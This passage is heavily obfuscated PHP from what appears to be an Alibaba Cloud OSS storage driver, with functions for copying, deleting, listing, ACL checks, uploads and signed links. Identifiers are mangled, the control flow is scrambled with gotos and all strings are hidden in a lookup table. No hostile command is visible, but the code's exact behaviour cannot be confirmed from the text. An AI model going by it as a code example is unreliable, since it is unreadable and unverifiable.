$this->getPathOuter($EÛ¤’¬Ú§Ó) : !1; } private function multiCopyObject($Bß±Ñ¯¸¹¼, $aÔÚ•øÅ‡Å, $C††õ‚ŸĞ–) { $d¸Ê³´£°â =& $_SERVER[¹÷ˆ§éÒ°ú]; try { goto CÑÖË‚ŒÎĞ; CÑÖË‚ŒÎĞ: $c©œÁÁ¾ã = array(); if ($FÅê¾‰‡ˆÒ = $this->hashMd5($Bß±Ñ¯¸¹¼)) { $c©œÁÁ¾ã = array(OSS\OssClient::OSS_HEADERS => array($d¸Ê³´£°â[1175] => $FÅê¾‰‡ˆÒ)); } $F¢¹åï¢Ö = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($aÔÚ•øÅ‡Å), $c©œÁÁ¾ã); goto C­·¥³¸™ø; C­·¥³¸™ø: $dÈ»„´°«Ø = 1; $cÕƒ‚æŞï£ = 0; $cÌáæó‚ó¾ = array(); goto dì„‰à‹ÁÛ; dì„‰à‹ÁÛ: $Eï‡–‚‘Õ = 1024 * 1024 * 10; $D—ÎŠ¦× = $this->client->generateMultiuploadParts($C††õ‚ŸĞ–, $Eï‡–‚‘Õ); foreach ($D—ÎŠ¦× as $Aëõ‚‹÷¹½ => $b´ƒÃì¦”½) { $BŒ ùôÓŒÅ = $cÕƒ‚æŞï£ + (int) $b´ƒÃì¦”½[$d¸Ê³´£°â[1176]]; $e«Ş¢¹óå = (int) $b´ƒÃì¦”½[$d¸Ê³´£°â[336]] + $BŒ ùôÓŒÅ - 1; $BŒ–Â·Àî„ = array($d¸Ê³´£°â[1177] => $BŒ ùôÓŒÅ, $d¸Ê³´£°â[1178] => $e«Ş¢¹óå); $cÌáæó‚ó¾[] = $this->client->uploadPartCopy($this->bucket, $Bß±Ñ¯¸¹¼, $this->bucket, $this->pathEncode($aÔÚ•øÅ‡Å), $dÈ»„´°«Ø, $F¢¹åï¢Ö, $BŒ–Â·Àî„); $dÈ»„´°«Ø = $dÈ»„´°«Ø + 1; } goto Dö˜†‡´§‘; Dö˜†‡´§‘: $aÌ–˜·Åêİ = array(); foreach ($cÌáæó‚ó¾ as $Aëõ‚‹÷¹½ => $c²‡‡ãÕ‡§) { $aÌ–˜·Åêİ[] = array($d¸Ê³´£°â[1179] => $Aëõ‚‹÷¹½ + 1, $d¸Ê³´£°â[1180] => $c²‡‡ãÕ‡§); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($aÔÚ•øÅ‡Å), $F¢¹åï¢Ö, $aÌ–˜·Åêİ); goto DÈ ÖŒåÍ‘; DÈ ÖŒåÍ‘: } catch (OSS\Core\OssException $f¼¾îÆ²) { return !1; } return !0; } public function moveFile($f‘£ç“¢Î, $aâä­¨ƒÌ¬) { if ($this->copyFile($f‘£ç“¢Î, $aâä­¨ƒÌ¬)) { $this->remove($f‘£ç“¢Î); return $this->getPathOuter($aâä­¨ƒÌ¬); } return !1; } public function delFile($dá«Œ…Ã‘) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($dá«Œ…Ã‘)); } catch (OSS\Core\OssException $d–¸Ï¤®­) { return !1; } return !0; } public function delFolder($d‰ìƒİ‘ğ) { $dÁ†”°»Üœ =& $_SERVER[¹÷ˆ§éÒ°ú]; $d»³ê‡©öå = $this->fileList($d‰ìƒİ‘ğ); if (!empty($d‰ìƒİ‘ğ) && !in_array(trim($d‰ìƒİ‘ğ, $dÁ†”°»Üœ[18]) . $dÁ†”°»Üœ[18], $d»³ê‡©öå[$dÁ†”°»Üœ[85]])) { $d»³ê‡©öå[$dÁ†”°»Üœ[85]][] = trim($d‰ìƒİ‘ğ, $dÁ†”°»Üœ[18]) . $dÁ†”°»Üœ[18]; } foreach (array_chunk($d»³ê‡©öå[$dÁ†”°»Üœ[85]], 1000) as $Dµƒ•Î½¢†) { try { $this->client->deleteObjects($this->bucket, $Dµƒ•Î½¢†); } catch (OSS\Core\OssException $A·ÄÛ¸Á¬¨) { continue; } } return !0; } public function rename($bšÙ³§ªà·, $Eµİœ¥îª) { return $this->renameObject($bšÙ³§ªà·, $Eµİœ¥îª); } private function fileInfo($Dè„ÖãŞ´‰, $Bô¦ßğà” = array()) { goto fôÈÇ¨½ñ¦; fôÈÇ¨½ñ¦: $eÜˆëªãĞ¤ =& $_SERVER[¹÷ˆ§éÒ°ú]; $d£©ÃŒÊ» = array($eÜˆëªãĞ¤[38] => $this->pathThis($Dè„ÖãŞ´‰), $eÜˆëªãĞ¤[87] => $this->getPathOuter($Dè„ÖãŞ´‰), $eÜˆëªãĞ¤[39] => $eÜˆëªãĞ¤[179], $eÜˆëªãĞ¤[199] => 0, $eÜˆëªãĞ¤[119] => 0, $eÜˆëªãĞ¤[89] => 0, $eÜˆëªãĞ¤[172] => $this->ext($Dè„ÖãŞ´‰), $eÜˆëªãĞ¤[200] => !0, $eÜˆëªãĞ¤[201] => !0); if (empty($Bô¦ßğà”)) { $CÆÚ Úª™Ñ = $this->objectMeta($Dè„ÖãŞ´‰); if (!$CÆÚ Úª™Ñ) { return $d£©ÃŒÊ»; } $Bô¦ßğà” = array($eÜˆëªãĞ¤[119] => strtotime($CÆÚ Úª™Ñ[$eÜˆëªãĞ¤[1181]]), $eÜˆëªãĞ¤[89] => $CÆÚ Úª™Ñ[$eÜˆëªãĞ¤[1182]] + 0); } goto eäÍçé·„; dÀµ•÷àè¹: return $d£©ÃŒÊ»; goto F›Ó§ÃÎ; eäÍçé·„: if (isset($Bô¦ßğà”[$eÜˆëªãĞ¤[89]])) { $d£©ÃŒÊ»[$eÜˆëªãĞ¤[89]] = $Bô¦ßğà”[$eÜˆëªãĞ¤[89]]; } if (isset($Bô¦ßğà”[$eÜˆëªãĞ¤[119]])) { $d£©ÃŒÊ»[$eÜˆëªãĞ¤[119]] = $Bô¦ßğà”[$eÜˆëªãĞ¤[119]]; } if (isset($Bô¦ßğà”[$eÜˆëªãĞ¤[202]]) && !trim($d£©ÃŒÊ»[$eÜˆëªãĞ¤[119]])) { $d£©ÃŒÊ»[$eÜˆëªãĞ¤[119]] = $Bô¦ßğà”[$eÜˆëªãĞ¤[202]]; } goto dÀµ•÷àè¹; F›Ó§ÃÎ: } private function folderInfo($E¬„âÅãˆ, $F…Ó¡¬„Æ = array()) { $cæÂ¦º—ÊÜ =& $_SERVER[¹÷ˆ§éÒ°ú]; $c£ö§½–îš = array($cæÂ¦º—ÊÜ[38] => $this->pathThis($E¬„âÅãˆ), $cæÂ¦º—ÊÜ[87] => $this->getPathOuter($cæÂ¦º—ÊÜ[18] . $E¬„âÅãˆ), $cæÂ¦º—ÊÜ[39] => $cæÂ¦º—ÊÜ[88], $cæÂ¦º—ÊÜ[199] => 0, $cæÂ¦º—ÊÜ[119] => 0, $cæÂ¦º—ÊÜ[200] => !0, $cæÂ¦º—ÊÜ[201] => !0); if (empty($F…Ó¡¬„Æ)) { $E¬„âÅãˆ = rtrim($E¬„âÅãˆ, $cæÂ¦º—ÊÜ[18]) . $cæÂ¦º—ÊÜ[18]; $d‰¶àï– = $this->objectMeta($E¬„âÅãˆ); if (!$d‰¶àï–) { return $c£ö§½–îš; } $F…Ó¡¬„Æ = array($cæÂ¦º—ÊÜ[199] => $d‰¶àï–[$cæÂ¦º—ÊÜ[1183]][$cæÂ¦º—ÊÜ[1184]], $cæÂ¦º—ÊÜ[119] => strtotime($d‰¶àï–[$cæÂ¦º—ÊÜ[1181]])); } if (isset($F…Ó¡¬„Æ[$cæÂ¦º—ÊÜ[119]])) { $c£ö§½–îš[$cæÂ¦º—ÊÜ[119]] = $F…Ó¡¬„Æ[$cæÂ¦º—ÊÜ[119]]; } if (isset($F…Ó¡¬„Æ[$cæÂ¦º—ÊÜ[199]])) { $c£ö§½–îš[$cæÂ¦º—ÊÜ[199]] = $F…Ó¡¬„Æ[$cæÂ¦º—ÊÜ[199]]; } return $c£ö§½–îš; } public function listPath($C³¤ÂóÎÖ, $aÊÛòì½Å³ = false) { $Fİ¸ó¸Ó¯ =& $_SERVER[¹÷ˆ§éÒ°ú]; $bÊ¶¦õ•÷ = $this->fileList($C³¤ÂóÎÖ, $Fİ¸ó¸Ó¯[18], !0); foreach ($bÊ¶¦õ•÷[$Fİ¸ó¸Ó¯[86]] as $DŒ„ãóËÀè => $EßÃ»”Ñ¡á) { $bÊ¶¦õ•÷[$Fİ¸ó¸Ó¯[86]][$DŒ„ãóËÀè] = $this->folderInfo($EßÃ»”Ñ¡á, $EßÃ»”Ñ¡á); } foreach ($bÊ¶¦õ•÷[$Fİ¸ó¸Ó¯[85]] as $DŒ„ãóËÀè => $EßÃ»”Ñ¡á) { $bÊ¶¦õ•÷[$Fİ¸ó¸Ó¯[85]][$DŒ„ãóËÀè] = $this->fileInfo($EßÃ»”Ñ¡á[$Fİ¸ó¸Ó¯[38]], $EßÃ»”Ñ¡á); } return $bÊ¶¦õ•÷; } public function has($CŠñ“Ôò‰•, $A¾«Œ÷Åİã = false, $FÖã¬“Ä£Ã = true) { goto d˜Ç’È‡øØ; d˜Ç’È‡øØ: $b Û÷»Éæ‰ =& $_SERVER[¹÷ˆ§éÒ°ú]; $CŠñ“Ôò‰• = trim($CŠñ“Ôò‰•, $b Û÷»Éæ‰[18]); $c­½òÅ´¸ = empty($CŠñ“Ôò‰•) ? $b Û÷»Éæ‰[43] : $CŠñ“Ôò‰• . $b Û÷»Éæ‰[18]; goto E…Ê£æÑá; bäêîîè–î: $DãÇ¥Ì¤ˆ˜ = 0; while (!0) { $dØ£ŞÚ˜“ô = array($b Û÷»Éæ‰[1172] => $b Û÷»Éæ‰[18], $b Û÷»Éæ‰[198] => $c­½òÅ´¸, $b Û÷»Éæ‰[1173] => $AŸ»äŠİĞõ, $b Û÷»Éæ‰[1174] => $c¤ŞÛ²Í÷); try { $Aµ‹Ã…Ú = $this->client->listObjects($this->bucket, $dØ£ŞÚ˜“ô); } catch (OSS\Core\OssException $e¥¼‰æôê‰) { break; } $c¤ŞÛ²Í÷ = $Aµ‹Ã…Ú->getNextMarker(); $cìæÇ¼á¾ = $Aµ‹Ã…Ú->getObjectList(); $aÑ¼š¨£†¬ = $Aµ‹Ã…Ú->getPrefixList(); if ($A¾«Œ÷Åİã) { if (count($cìæÇ¼á¾) > 1 || count($cìæÇ¼á¾) == 1 && $cìæÇ¼á¾[0]->getKey() != $c­½òÅ´¸) { $aëƒ¯·İ¬ê += count($cìæÇ¼á¾) - 1; } if (!empty($aÑ¼š¨£†¬)) { $DãÇ¥Ì¤ˆ˜ += count($aÑ¼š¨£†¬); } if ($c¤ŞÛ²Í÷ === $b Û÷»Éæ‰[43]) { break; } continue; } if ($FÖã¬“Ä£Ã) { if (!empty($cìæÇ¼á¾)) { if (count($cìæÇ¼á¾) > 1 || $cìæÇ¼á¾[0]->getKey() != $c­½òÅ´¸) { return !0; } } } else { if (!empty($aÑ¼š¨£†¬)) { return !0; } } if ($c¤ŞÛ²Í÷ === $b Û÷»Éæ‰[43]) { break; } } if ($A¾«Œ÷Åİã) { return array($b Û÷»Éæ‰[203] => $aëƒ¯·İ¬ê, $b Û÷»Éæ‰[204] => $DãÇ¥Ì¤ˆ˜); } goto Fêê–ˆÜãİ; Fêê–ˆÜãİ: return !1; goto bê¶§ÜŞøº; E…Ê£æÑá: $c¤ŞÛ²Í÷ = $b Û÷»Éæ‰[43]; $AŸ»äŠİĞõ = 500; $aëƒ¯·İ¬ê = 0; goto bäêîîè–î; bê¶§ÜŞøº: } public function listAll($E½ºêÉ¡¾) { $cğ‹ƒÔää =& $_SERVER[¹÷ˆ§éÒ°ú]; $aÒš ¼ƒî = $this->fileList($E½ºêÉ¡¾, $cğ‹ƒÔää[43], !0); $Fù‘ìáìŞ® = array(); foreach ($aÒš ¼ƒî[$cğ‹ƒÔää[85]] as $EÈ¨ğŒÓòŒ) { $Fù‘ìáìŞ®[$EÈ¨ğŒÓòŒ[$cğ‹ƒÔää[38]]] = $EÈ¨ğŒÓòŒ[$cğ‹ƒÔää[89]]; } return $this->listAllFiles($E½ºêÉ¡¾, array_keys($Fù‘ìáìŞ®), $Fù‘ìáìŞ®); } public function canRead($b«»ÔÃ·Œ…) { $eÇ¦ôÄäÜê =& $_SERVER[¹÷ˆ§éÒ°ú]; $B„†÷§‡ = $this->pathAcl($b«»ÔÃ·Œ…); return $B„†÷§‡ == $eÇ¦ôÄäÜê[1185] || $B„†÷§‡ == $eÇ¦ôÄäÜê[504] ? !0 : !1; } public function canWrite($BËï…ĞàºÑ) { $c‘™Š‰³ŠĞ = $this->pathAcl($BËï…ĞàºÑ); return $c‘™Š‰³ŠĞ == $_SERVER[¹÷ˆ§éÒ°ú][504] ? !0 : !1; } public function pathAcl($FÃ¸Ëö–«ã) { goto dµƒ¦‚ß; BŒÁ¾³®†: $Føíæ§êÈ = $b¾ğÎ“‘© == $a˜ùøöå´È[44] ? $this->bucketAcl : $b¾ğÎ“‘©; if ($Føíæ§êÈ == $a˜ùøöå´È[1186]) { return $a˜ùøöå´È[1185]; } if ($Føíæ§êÈ == $a˜ùøöå´È[1187]) { return $a˜ùøöå´È[504]; } goto A²ëÖÑ”Û; dµƒ¦‚ß: $a˜ùøöå´È =& $_SERVER[¹÷ˆ§éÒ°ú]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $b¾ğÎ“‘© = $this->client->getObjectAcl($this->bucket, $this->pathEncode($FÃ¸Ëö–«ã)); } catch (OSS\Core\OssException $Cß½ô¨­„¿) { return !1; } goto BŒÁ¾³®†; A²ëÖÑ”Û: return $Føíæ§êÈ; goto C”É©¼¸Ş¾; C”É©¼¸Ş¾: } private function chmodPath($bğ¸Ãéšá‘, $eÉ“ô„¾Ê– = '') { $CÃé×¢ºÙ‹ =& $_SERVER[¹÷ˆ§éÒ°ú]; $A°Ûä³²À¹ = empty($eÉ“ô„¾Ê–) ? $CÃé×¢ºÙ‹[1187] : $eÉ“ô„¾Ê–; $dÅëó«‘š = array($CÃé×¢ºÙ‹[44], $CÃé×¢ºÙ‹[197], $CÃé×¢ºÙ‹[1186], $CÃé×¢ºÙ‹[1187]); if (!in_array($A°Ûä³²À¹, $dÅëó«‘š)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($bğ¸Ãéšá‘), $A°Ûä³²À¹); } catch (OSS\Core\OssException $aÇ’œ±ğÆê) { return !1; } return !0; } public function getContent($DÃ§®‹Ö¤È) { return $this->fileSubstr($DÃ§®‹Ö¤È, -1); } public function setContent($e·†¡ÅÒÒª, $b¥ƒ‡º³‹ = '') { $b³ã‡òøˆ =& $_SERVER[¹÷ˆ§éÒ°ú]; try { $Aã–Õ…Õ¸Ë = $this->trafficLimit($b³ã‡òøˆ[1188]); $eõñÂôĞº´ = $this->client->putObject($this->bucket, $this->pathEncode($e·†¡ÅÒÒª), $b¥ƒ‡º³‹, $Aã–Õ…Õ¸Ë); } catch (OSS\Core\OssException $eõ¯Ä¾¯¶¯) { return !1; } $eø°ºŠ‚Ò¸ = array($b³ã‡òøˆ[1175] => trim($eõñÂôĞº´[$b³ã‡òøˆ[1189]], $b³ã‡òøˆ[125]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($e·†¡ÅÒÒª))); $this->updateObjMeta($e·†¡ÅÒÒª, $eø°ºŠ‚Ò¸); return isset($eõñÂôĞº´[$b³ã‡òøˆ[1190]][$b³ã‡òøˆ[1137]]) ? (int) $eõñÂôĞº´[$b³ã‡òøˆ[1190]][$b³ã‡òøˆ[1137]] : strlen($eõñÂôĞº´); } private function updateObjMeta($dÖ‡ÊØíÕ¸, $e¦·¾¡ŠÂÄ) { $dÖ‡ÊØíÕ¸ = $this->pathEncode($dÖ‡ÊØíÕ¸); try { $dŠêÁé…¬‚ = array(OSS\OssClient::OSS_HEADERS => $e¦·¾¡ŠÂÄ); $this->client->copyObject($this->bucket, $dÖ‡ÊØíÕ¸, $this->bucket, $dÖ‡ÊØíÕ¸, $dŠêÁé…¬‚); } catch (OSS\Core\OssException $D¾á›„îËñ) { return !1; } return !0; } public function upload($dÓºİ„«õ, $bĞš¦Ô¾¢, $d„ÃÌ•°° = false, $F°í›èÕ• = REPEAT_REPLACE) { $a§ø’åÃ±¶ =& $_SERVER[¹÷ˆ§éÒ°ú]; $cĞ–âîƒòÅ = trim($dÓºİ„«õ, $a§ø’åÃ±¶[18]); $FÒ„Á¿ãÕí = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($a§ø’åÃ±¶[1175] => @md5_file($bĞš¦Ô¾¢)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($dÓºİ„«õ))); $FÒ„Á¿ãÕí = $this->trafficLimit($a§ø’åÃ±¶[1188], $FÒ„Á¿ãÕí); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($cĞ–âîƒòÅ), $bĞš¦Ô¾¢, $FÒ„Á¿ãÕí); } catch (OSS\Core\OssException $e—£±¢Ù) { return !1; } return $this->getPathOuter($dÓºİ„«õ); } public function getHost() { $dµ‰´è =& $_SERVER[¹÷ˆ§éÒ°ú]; $bÀ÷Ôˆõ·¢ = explode($dµ‰´è[183], parent::getHost()); return $bÀ÷Ôˆõ·¢[0] . $dµ‰´è[183] . $this->bucket . $dµ‰´è[103] . $bÀ÷Ôˆõ·¢[1]; } public function uploadFormData($b…Â“²»ƒ¥, $E¡¬Ç§ÍÂå = 3600) { goto F†©ºÒ¶; aÇñÈ§½ãÖ: return $c¡§ƒ­Öàä; goto eÎÀêÆÄ»¤; F¶ÕÅ°Àæ‰: $EÎå©ßÙ¶ = strpos($FÑ¶ß‘´¢Û, $A ÈŸõ¶Ê[295]); $FÑ¶ß‘´¢Û = substr($FÑ¶ß‘´¢Û, 0, $EÎå©ßÙ¶) . $A ÈŸõ¶Ê[1192]; $E‘›‡¡¼¾Â = 1048576000 * 5; goto EãÖ‘éæÖ; F†©ºÒ¶: $A ÈŸõ¶Ê =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!($DÄÑ†…‚ƒ˜ = $this->getHost())) { return !1; } $c…ğÎÈĞÔù = $E¡¬Ç§ÍÂå; goto dÌâ–İ¬Š; B÷Ó” £: $b¾®äî‹°¼ = base64_encode(hash_hmac($A ÈŸõ¶Ê[229], $B˜ ĞçºÄñ, $this->secret, !0)); $c¡§ƒ­Öàä = array($A ÈŸõ¶Ê[1103] => $B˜ ĞçºÄñ, $A ÈŸõ¶Ê[1194] => $this->accessKey, $A ÈŸõ¶Ê[1099] => $A ÈŸõ¶Ê[1091], $A ÈŸõ¶Ê[1195] => $b¾®äî‹°¼, $A ÈŸõ¶Ê[181] => $DÄÑ†…‚ƒ˜); $c¡§ƒ­Öàä = $this->trafficLimit($A ÈŸõ¶Ê[1188], $c¡§ƒ­Öàä); goto aÇñÈ§½ãÖ; EãÖ‘éæÖ: $E…ˆà†÷‘¯ = $this->pathFather($b…Â“²»ƒ¥); $Dñ¿»âùò‰ = array($A ÈŸõ¶Ê[1093] => $FÑ¶ß‘´¢Û, $A ÈŸõ¶Ê[1094] => array(array($A ÈŸõ¶Ê[1193], 0, $E‘›‡¡¼¾Â), array($A ÈŸõ¶Ê[1097], $A ÈŸõ¶Ê[1098], $E…ˆà†÷‘¯))); $B˜ ĞçºÄñ = base64_encode(json_encode($Dñ¿»âùò‰)); goto B÷Ó” £; dÌâ–İ¬Š: $b¸Œ‘¶—æ¾ = date($A ÈŸõ¶Ê[1191], time() + $c…ğÎÈĞÔù); $BÎ‘Âó¨‚ê = new DateTime($b¸Œ‘¶—æ¾); $FÑ¶ß‘´¢Û = $BÎ‘Âó¨‚ê->format(DateTime::ISO8601); goto F¶ÕÅ°Àæ‰; eÎÀêÆÄ»¤: } public function multiUploadFormData($fÚ‚õØç, $B¯¼â×Ïœà = 3600) { $aÖÂƒ•ÑĞ‰ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!($b¹âÎ¦õó¢ = $this->getHost())) { return !1; } $b×µªíÎ À = $this->trafficLimit($aÖÂƒ•ÑĞ‰[1188]); $C–´‰ó­è­ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($fÚ‚õØç), $b×µªíÎ À); return array($aÖÂƒ•ÑĞ‰[221] => $C–´‰ó­è­, $aÖÂƒ•ÑĞ‰[181] => $b¹âÎ¦õó¢ . $aÖÂƒ•ÑĞ‰[18] . $this->pathEncode($fÚ‚õØç), $aÖÂƒ•ÑĞ‰[222] => gmdate($aÖÂƒ•ÑĞ‰[1196]), $aÖÂƒ•ÑĞ‰[101] => $fÚ‚õØç); } public function multiUploadAuthData($fã¦¦¯ÖÛ, $dò–á…„à‡ = array()) { goto Dí‹æà›…õ; Dí‹æà›…õ: $b¼îÛÜÍ =& $_SERVER[¹÷ˆ§éÒ°ú]; $c¦£À³Ñ = isset($dò–á…„à‡[$b¼îÛÜÍ[222]]) ? $dò–á…„à‡[$b¼îÛÜÍ[222]] : gmdate($b¼îÛÜÍ[1196]); $B‘½à“šéù = isset($dò–á…„à‡[$b¼îÛÜÍ[172]]) ? $dò–á…„à‡[$b¼îÛÜÍ[172]] : $b¼îÛÜÍ[43]; goto eÊÊ˜»ì´; c£êĞ²ğ›: $Dï‹èØÙìä = array($b¼îÛÜÍ[224], $b¼îÛÜÍ[43], $b¼îÛÜÍ[128], $c¦£À³Ñ, "\x78\x2d\x6f\x73\163\x2d\144\x61\164\145\x3a{$c¦£À³Ñ}", $b¼îÛÜÍ[18] . $this->bucket . $b¼îÛÜÍ[18] . $aÄƒ¡îñ¯‹ . $B‘½à“šéù); if (strpos($B‘½à“šéù, $b¼îÛÜÍ[225]) === 0) { $Dï‹èØÙìä[0] = $b¼îÛÜÍ[226]; if ($c¼Ë‘ª²Í½ = $this->trafficLimit($b¼îÛÜÍ[1188])) { $aÄƒ¡îñ¯‹ = $b¼îÛÜÍ[1197]; array_splice($Dï‹èØÙìä, 5, 0, $aÄƒ¡îñ¯‹ . $b¼îÛÜÍ[14] . $c¼Ë‘ª²Í½[$aÄƒ¡îñ¯‹]); } } if (isset($dò–á…„à‡[$b¼îÛÜÍ[227]]) && $dò–á…„à‡[$b¼îÛÜÍ[227]] == $b¼îÛÜÍ[228]) { $Dï‹èØÙìä[0] = $b¼îÛÜÍ[228]; } goto EĞ•àéº§Ñ; EĞ•àéº§Ñ: if (!empty($dò–á…„à‡[$b¼îÛÜÍ[1198]])) { $E†‹„¿¹Ú³ = array_merge(array($Dï‹èØÙìä[4]), $dò–á…„à‡[$b¼îÛÜÍ[1198]]); sort($E†‹„¿¹Ú³); $Dï‹èØÙìä[4] = implode($b¼îÛÜÍ[10], $E†‹„¿¹Ú³); } $F¸Æˆ÷î‚ = implode($b¼îÛÜÍ[10], $Dï‹èØÙìä); $A²˜†´–Ï = base64_encode(hash_hmac($b¼îÛÜÍ[229], $F¸Æˆ÷î‚, $this->secret, !0)); goto E¨®„õæé”; eÊÊ˜»ì´: $aÄƒ¡îñ¯‹ = $fã¦¦¯ÖÛ; if (isset($dò–á…„à‡[$b¼îÛÜÍ[101]])) { $aÄƒ¡îñ¯‹ = $dò–á…„à‡[$b¼îÛÜÍ[101]]; unset($dò–á…„à‡[$b¼îÛÜÍ[101]]); } if (isset($dò–á…„à‡[$b¼îÛÜÍ[223]])) { $dò–á…„à‡[$b¼îÛÜÍ[222]] = $c¦£À³Ñ; return $this->listUploadParts($aÄƒ¡îñ¯‹, $dò–á…„à‡); } goto c£êĞ²ğ›; E¨®„õæé”: $f¶´Èô¿¥ = $b¼îÛÜÍ[1199] . $this->accessKey . $b¼îÛÜÍ[14] . $A²˜†´–Ï; if (strpos($B‘½à“šéù, $b¼îÛÜÍ[225]) === 0) { $f¶´Èô¿¥ = array($b¼îÛÜÍ[231] => $f¶´Èô¿¥, $b¼îÛÜÍ[222] => $c¦£À³Ñ); if ($c¼Ë‘ª²Í½) { $f¶´Èô¿¥ = array_merge($f¶´Èô¿¥, $c¼Ë‘ª²Í½); } } return $f¶´Èô¿¥; goto eÒÆÂè”Å; eÒÆÂè”Å: } public function listUploadParts($bêòñ‹¥‡¿, $bĞõóÇ¢ô¢) { goto DŒ¶“Ú°ñ«; a‘¯™Ü‡: return array($CíÎùä¯ùÈ[231] => $F´‚Êæ‘½˜, $CíÎùä¯ùÈ[222] => $bĞõóÇ¢ô¢[$CíÎùä¯ùÈ[222]], $CíÎùä¯ùÈ[233] => $FÃ‚ˆÆ±µ¢); goto A““ƒ¦‡÷ ; DŒ¶“Ú°ñ«: $CíÎùä¯ùÈ =& $_SERVER[¹÷ˆ§éÒ°ú]; $FÉƒù©÷‰Œ = parse_url_query($bĞõóÇ¢ô¢[$CíÎùä¯ùÈ[172]]); $b½æŠ²îñ® = $this->client->listParts($this->bucket, $this->pathEncode($bêòñ‹¥‡¿), $FÉƒù©÷‰Œ[$CíÎùä¯ùÈ[221]]); goto EªñóÒ‡ÁÔ; EªñóÒ‡ÁÔ: $f‹ƒ«ÄöŒ‹ = $b½æŠ²îñ®->getListPart(); $FÃ‚ˆÆ±µ¢ = array(); foreach ($f‹ƒ«ÄöŒ‹ as $d˜¦‡¶ÛÖ—) { $FÃ‚ˆÆ±µ¢[] = array($CíÎùä¯ùÈ[1179] => $d˜¦‡¶ÛÖ—->getPartNumber(), $CíÎùä¯ùÈ[1180] => trim($d˜¦‡¶ÛÖ—->getETag(), $CíÎùä¯ùÈ[125])); } goto AÆÇ•ë‚§İ; AÆÇ•ë‚§İ: unset($bĞõóÇ¢ô¢[$CíÎùä¯ùÈ[223]], $bĞõóÇ¢ô¢[$CíÎùä¯ùÈ[227]]); $F´‚Êæ‘½˜ = $this->multiUploadAuthData($bêòñ‹¥‡¿, $bĞõóÇ¢ô¢); if (empty($F´‚Êæ‘½˜)) { return !1; } goto a‘¯™Ü‡; A““ƒ¦‡÷ : } public function download($DÚÁŞŸ±, $C™×¨¼ÊŠõ) { if ($this->isFolder($DÚÁŞŸ±)) { return !1; } try { $C¨ÁÇ˜œ–İ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $C™×¨¼ÊŠõ); $C¨ÁÇ˜œ–İ = $this->trafficLimit($_SERVER[¹÷ˆ§éÒ°ú][117], $C¨ÁÇ˜œ–İ); $this->client->getObject($this->bucket, $this->pathEncode($DÚÁŞŸ±), $C¨ÁÇ˜œ–İ); } catch (OSS\Core\OssException $Cí§¢ÕŠğÙ) { return !1; } return $C™×¨¼ÊŠõ; } public function fileSubstr($fÅ§¬Ã, $a²°ãÏœ = 0, $fÏÖåéáìã = false) { if ($a²°ãÏœ === -1) { $cí­Ñ—Ñã® = array(); } else { if ($fÏÖåéáìã === !1) { $Aœåó¨…¤¯ = $this->size($fÅ§¬Ã); } else { $Aœåó¨…¤¯ = $a²°ãÏœ + $fÏÖåéáìã - 1; } $cí­Ñ—Ñã® = array(OSS\OssClient::OSS_RANGE => "{$a²°ãÏœ}\55{$Aœåó¨…¤¯}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($fÅ§¬Ã), $cí­Ñ—Ñã®); } catch (OSS\Core\OssException $AÂÏöá¡Í) { think_exception($AÂÏöá¡Í->getMessage()); return !1; } } private function trafficLimit($E¨îƒåœíí, $BÑÚäŒœäÁ = array()) { goto e¡Ñ«öŒ¡ƒ; C—»å°¢‹•: return $BÑÚäŒœäÁ; goto föß‹µƒİ„; e¡Ñ«öŒ¡ƒ: $AÏ‘ÔòîÃ =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($E¨îƒåœíí == $AÏ‘ÔòîÃ[1188] && $this->isUploadServer() || $E¨îƒåœíí == $AÏ‘ÔòîÃ[117] && $this->isFileOutServer()) { return $BÑÚäŒœäÁ; } $E¯Åáå·éÂ = floatval($GLOBALS[$AÏ‘ÔòîÃ[16]][$AÏ‘ÔòîÃ[96]][$AÏ‘ÔòîÃ[115]][$E¨îƒåœíí]) * 1024 * 1024 * 8; goto d¸šÂ¸¾…‹; d¸šÂ¸¾…‹: if (!$E¯Åáå·éÂ) { return $BÑÚäŒœäÁ; } $E¯Åáå·éÂ = $E¯Åáå·éÂ < 819200 ? 819200 : ($E¯Åáå·éÂ > 838860800 ? 838860800 : $E¯Åáå·éÂ); $BÑÚäŒœäÁ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($E¯Åáå·éÂ); goto C—»å°¢‹•; föß‹µƒİ„: } public function link($c»ÅÎôè¿§, $aëÓ…‰‰ºÁ = array()) { $B…¼›´‡˜Œ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$this->exist($c»ÅÎôè¿§) || $this->isFolder($c»ÅÎôè¿§)) { return !1; } try { $aëÓ…‰‰ºÁ = $this->trafficLimit($B…¼›´‡˜Œ[117], $aëÓ…‰‰ºÁ); $F”‹‰ôœÜ = $this->client->signUrl($this->bucket, $this->pathEncode($c»ÅÎôè¿§), 3600 * 12, $B…¼›´‡˜Œ[228], $aëÓ…‰‰ºÁ); return $this->getCdnLink($F”‹‰ôœÜ); } catch (OSS\Core\OssException $cÉëãÄ«ÚÔ) { return !1; } } public function fileOut($bå°–…äµ, $Fæ½šØÈ˜Œ = false, $AğËÍĞŸõğ = false, $AÅ´İ°ßŸè = '') { goto D™Úò‘Ì»ƒ; F¹µ´°Ù’Ë: $Fæ½šØÈ˜Œ = $Fæ½šØÈ˜Œ ? $e–ãÃãÜ’[214] : $e–ãÃãÜ’[215]; $F‹öé»»à = array(OSS\OssClient::OSS_SUB_RESOURCE => $e–ãÃãÜ’[1200] . rawurlencode("{$Fæ½šØÈ˜Œ}\73\146\x69\154\145\x6e\141\155\145\75{$AğËÍĞŸõğ}")); 